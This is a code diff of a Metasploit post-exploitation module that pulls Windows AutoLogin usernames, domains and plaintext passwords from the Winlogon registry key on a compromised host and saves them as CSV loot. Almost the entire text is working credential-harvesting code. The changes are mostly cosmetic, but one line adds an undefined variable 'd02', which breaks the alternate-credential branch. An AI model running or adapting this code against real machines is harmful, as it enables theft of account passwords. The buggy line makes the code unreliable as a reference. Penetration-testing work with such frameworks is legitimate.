@@ -40,7 +40,6 @@ class Metasploit3 < Msf::Post
 					[ 'URL', 'http://support.microsoft.com/kb/315231' ],
 					[ 'URL', 'http://core.yehg.net/lab/#tools.exploits' ]
 				]
-				
 		))
 	end
 
@@ -49,71 +48,69 @@ class Metasploit3 < Msf::Post
 
 		host_name = sysinfo['Computer']
 		print_status("Running against #{host_name} on session #{datastore['SESSION']}")
-		
+
 		creds = Rex::Ui::Text::Table.new(
 			'Header'  => 'Windows AutoLogin Password',
-			'Ident'   => 1,
+			'Indent'   => 1,
 			'Columns' => [
-				'Domain',
 				'UserName',
-				'Password'
+				'Password',
+				'Domain'
 			]
-		)	
+		)
 
 		has_al = 0
-		
+
 		# DefaultDomainName, DefaultUserName, DefaultPassword
 		# AltDefaultDomainName, AltDefaultUserName, AltDefaultPassword
 		logon_key = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\"
 		al = registry_getvaldata(logon_key, "AutoAdminLogon")
-		
+
 		do1 = registry_getvaldata(logon_key, "DefaultDomainName")
 		du1 = registry_getvaldata(logon_key, "DefaultUserName")
 		dp1 = registry_getvaldata(logon_key, "DefaultPassword")
-		
+
 		do2 = registry_getvaldata(logon_key, "AltDefaultDomainName")
 		du2 = registry_getvaldata(logon_key, "AltDefaultUserName")
 		dp2 = registry_getvaldata(logon_key, "AltDefaultPassword")
-		
+
 		if do1 != '' and  du1 != '' and dp1 == '' and al == '1'
 			has_al = 1
 			dp1 = '[No Password!]'
-			creds << [do1,du1,dp1]
+			creds << [du1,dp1, do1]
 			print_good("DefaultDomain=#{do1}, DefaultUser=#{du1}, DefaultPassword=#{dp1}")
 		elsif do1 != '' and  du1 != '' and dp1 != ''
 			has_al = 1
-			creds << [do1,du1,dp1]
+			creds << [du1,dp1, do1]
 			print_good("DefaultDomain=#{do1}, DefaultUser=#{du1}, DefaultPassword=#{dp1}")
 		end
-		
+
 		if do2 != '' and  du2 != '' and dp2 == '' and al == '1'
 			has_al = 1
 			dp2 = '[No Password!]'
-			creds << [do2,du2,dp2]
+			creds << [du2,dp2,d02]
 			print_good("AltDomain=#{do2}, AltUser=#{du2}, AltPassword=#{dp2}")
 		elsif do2 != '' and  du2 != '' and dp2 != ''
 			has_al = 1
-			creds << [do2,du2,dp2]
+			creds << [du2,dp2,do2]
 			print_good("AltDomain=#{do2}, AltUser=#{du2}, AltPassword=#{dp2}")
 		end
-		
+
 		if has_al == 0
 			print_status("The Host #{host_name} is not configured to have AutoLogon password")
 			return
 		end
-		
 
 		print_status("Storing data...")
 		path = store_loot(
 			'windows.autologin.user.creds',
-			'text/plain',
+			'text/csv',
 			session,
-			creds,
-			'windows.autologin.user.creds.txt',
+			creds.to_csv,
+			'windows-autologin-user-creds.csv',
 			'Windows AutoLogin User Credentials'
 		)
 
 		print_status("Windows AutoLogin User Credentials saved in: #{path}")
 	end
-
 end
